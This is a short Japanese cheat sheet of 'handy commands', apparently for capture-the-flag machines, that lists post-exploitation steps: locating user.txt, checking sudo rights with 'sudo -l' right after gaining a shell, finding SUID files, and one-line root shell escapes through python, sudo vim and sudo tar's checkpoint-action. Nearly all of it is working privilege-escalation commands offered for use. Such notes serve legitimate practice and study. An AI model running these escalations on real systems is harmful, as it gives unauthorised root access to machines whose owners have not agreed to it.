# 便利コマンド

## 検索系

## ファイルを見つける

```bash
find / -type f -name "user.txt" 2>/dev/null
```

## 権限昇格系

## sudo で実行可能なコマンド確認

シェルを取れたら最初に実行すべき定番のコマンド

```bash
sudo -l
```

## SUID権限ファイル検索

```bash
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

## python で昇格

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## vim で昇格

```bash
sudo vim -c ':!/bin/sh'
```

## tar で昇格

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
